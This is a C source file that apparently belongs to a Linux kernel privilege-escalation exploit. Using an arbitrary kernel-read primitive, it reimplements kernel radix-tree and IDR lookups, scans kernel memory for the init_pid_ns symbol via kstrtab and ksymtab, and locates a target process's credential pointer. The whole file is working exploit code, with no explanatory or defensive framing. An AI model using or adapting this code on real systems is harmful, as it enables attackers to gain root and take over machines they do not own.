#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/user.h>

#include "kernel_defs.h"
#include "kmem_search.h"
#include "exploit_configs.h"


char* pKernelMemory = NULL;
uint32_t uiLen = 0;


// Userspace/exploit implementations of corresponding kernel functions

static inline unsigned long shift_maxindex(unsigned int shift)
{
    return (RADIX_TREE_MAP_SIZE << shift) - 1;
}

static inline unsigned long node_maxindex(const struct radix_tree_node *node)
{
    return shift_maxindex(node->shift);
}

static inline struct radix_tree_node *entry_to_node(void *ptr)
{
    return (void *)((unsigned long)ptr & ~RADIX_TREE_INTERNAL_NODE);
}

static inline bool radix_tree_is_internal_node(void *ptr)
{
    return ((unsigned long)ptr & RADIX_TREE_ENTRY_MASK) ==
                RADIX_TREE_INTERNAL_NODE;
}

static unsigned int radix_tree_descend(exploit_context* pCtx, const struct radix_tree_node *parent,
            struct radix_tree_node **nodep, unsigned long index)
{
    unsigned int offset = 0;
    void **entry = NULL;
    struct radix_tree_node node_in = {0};

    kernel_read(pCtx, (uint64_t)parent, (char*)&node_in, sizeof(node_in));
    offset = (index >> node_in.shift) & RADIX_TREE_MAP_MASK;

    entry = node_in.slots[offset];

    *nodep = (void *)entry;
    return offset;
}

static unsigned radix_tree_load_root(exploit_context* pCtx, const struct radix_tree_root *root,
        struct radix_tree_node **nodep, unsigned long *maxindex)
{
    struct radix_tree_node *node = root->xa_head;
    struct radix_tree_node node_in = {0};
    *nodep = node;

    if (radix_tree_is_internal_node(node))
    {
        node = entry_to_node(node);
        kernel_read(pCtx, (uint64_t)node, (char*)&node_in, sizeof(node_in));
        *maxindex = node_maxindex(&node_in);
        return node_in.shift + RADIX_TREE_MAP_SHIFT;
    }

    *maxindex = 0;
    return 0;
}

void *__radix_tree_lookup(exploit_context* pCtx, const struct radix_tree_root *root,
              unsigned long index, struct radix_tree_node **nodep,
              void ***slotp)
{
    struct radix_tree_node *node, *parent;
    unsigned long maxindex;
    void **slot;
    struct radix_tree_node node_in = {0};

 restart:
    parent = NULL;
    slot = (void **)&root->xa_head;
    radix_tree_load_root(pCtx, root, &node, &maxindex);

    if (index > maxindex)
        return NULL;

    while (radix_tree_is_internal_node(node)) {
        unsigned offset;

        parent = entry_to_node(node);
        offset = radix_tree_descend(pCtx, parent, &node, index);
        kernel_read(pCtx, (uint64_t)parent, (char*)&node_in, sizeof(node_in));
        slot = node_in.slots + offset;
        if (node == RADIX_TREE_RETRY)
            goto restart;
        if (node_in.shift == 0)
            break;
    }

    if (nodep)
        *nodep = parent;
    if (slotp)
        *slotp = slot;
    return node;
}

void *radix_tree_lookup(exploit_context* pCtx, const struct radix_tree_root *root, unsigned long index)
{
    return __radix_tree_lookup(pCtx, root, index, NULL, NULL);
}

void *idr_find(exploit_context* pCtx, const struct idr *idr, unsigned long id)
{
    return radix_tree_lookup(pCtx, &idr->idr_rt, id - idr->idr_base);
}

struct pid *find_pid_ns(exploit_context* pCtx, int nr)
{
    struct pid_namespace ns = {0};

    kernel_read(pCtx, pCtx->init_pid_ns, (char*)&ns, sizeof(ns));

    return idr_find(pCtx, &ns.idr, nr);
}

int find_pid_cred(exploit_context* pCtx, pid_t pid)
{
    int ret = -1;
    uint64_t pid_struct = 0;
    uint64_t first = 0;
    uint64_t task = 0;

    pid_struct = (uint64_t)find_pid_ns(pCtx, pid);

    if(!IS_KERNEL_POINTER(pid_struct))
    {
        goto done;
    }

    kernel_read(pCtx, pid_struct + PID_TASKS_OFFSET, (char*)&first, sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(first))
    {
        goto done;
    }

    task = first - TASK_LIST_OFFSET;

    kernel_read(pCtx, task + TASK_CRED_OFFSET, (char*)&pCtx->cred, sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pCtx->cred))
    {
        goto done;
    }
    
    ret = 0;
    
done:
    return ret;
}

// Custom search functions

char* strnstr_c(char *str, const char *substr, size_t n)
{
    char *p = str, *pEnd = str+n;
    size_t substr_len = strlen(substr);

    if(0 == substr_len)
    {
        return str;
    }

    pEnd -= (substr_len - 1);
    
    for(;p < pEnd; ++p)
    {
        if(0 == strncmp(p, substr, substr_len))
        {
            return p;
        }
    }

    return NULL;
}

int search_init_pid_ns_kstrtab(exploit_context* pCtx)
{
    int ret = -1;
    char init_pid_ns[] = "init_pid_ns";

    if(NULL == pKernelMemory)
    {
        pKernelMemory = malloc(PAGE_SIZE);
        uiLen = PAGE_SIZE;
    }

    for(uint32_t i = 0; i < KMEM_MAX_SEARCH; i+= PAGE_SIZE)
    {
        if(NULL == pKernelMemory)
        {
            printf("[-] failed to allocate memory!\n");
            goto done;
        }

        if(0 != kernel_read(pCtx, pCtx->array_map_ops + i, pKernelMemory + i, PAGE_SIZE))
        {
            goto done;
        }

        if(0 < i)
        {
            char* substr = strnstr_c(pKernelMemory + i - sizeof(init_pid_ns), init_pid_ns, PAGE_SIZE + sizeof(init_pid_ns));
            
            if(NULL != substr)
            {
                uint32_t offset = substr - pKernelMemory;
                pCtx->init_pid_ns_kstrtab = pCtx->array_map_ops + offset;
                ret = 0;
                break;
            }
        }

        pKernelMemory = realloc(pKernelMemory, i + 2*PAGE_SIZE);
        uiLen = i + 2*PAGE_SIZE;
    }

done:
    if((0 != ret) && (NULL != pKernelMemory))
    {
        free(pKernelMemory);
        pKernelMemory = NULL;
    }

    return ret;
}

int search_init_pid_ns_ksymtab(exploit_context* pCtx)
{
    int ret = -1;
    uint64_t pStartAddr = pCtx->array_map_ops;

    if(NULL == pKernelMemory)
    {
        goto done;
    }

    for(uint32_t i = 0; i < uiLen; i++)
    {
        uint32_t offset = *(uint32_t*)(pKernelMemory + i);

        if((pStartAddr + offset) == pCtx->init_pid_ns_kstrtab)
        {
            uint32_t value_offset = *(uint32_t*)(pKernelMemory + i - 0x4);
            pCtx-> init_pid_ns = pStartAddr + value_offset - 0x4;
            ret = 0;
            break;
        }
        
        pStartAddr++;
    }

done:
    if(NULL != pKernelMemory)
    {
        free(pKernelMemory);
        pKernelMemory = NULL;
    }

    return ret;
}
